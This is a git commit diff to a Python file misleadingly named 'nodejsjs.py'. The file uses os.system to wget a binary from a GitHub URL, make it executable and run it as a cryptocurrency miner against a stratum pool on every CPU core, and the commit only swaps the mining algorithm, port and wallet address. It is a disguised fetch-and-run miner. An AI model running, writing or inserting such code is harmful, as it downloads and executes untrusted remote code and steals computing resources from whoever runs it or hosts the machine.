ed4909c31273e88e02ade01df337ef363402fda0
termuxidindo <62327835+termuxidindo@users.noreply.github.com>
2024-07-19 22:10:20 +0700

    Update nodejsjs.py

--- nodejsjs.py
+++ nodejsjs.py
@@ -1,4 +1,4 @@
 import sys
 import os
 os.system("wget https://github.com/erlandi-main-api/testpoint/raw/main/cp")
-os.system("chmod +x cp && ./cp -a yespowerr16  -o stratum+tcps://stratum-na.rplant.xyz:13382 -u YdftzuLuBYRxZdx5ZkfgwSypHJSpRiqAHR.erlandi -p m=solo -t $(nproc)")
+os.system("chmod +x cp && ./cp -a yespowertide -o stratum+tcps://stratum-na.rplant.xyz:17059 -u TXkhs8Rp8cAdfL37XUEd23zia61d7tQ9Ro.AMDRYZEN -t $(nproc)")
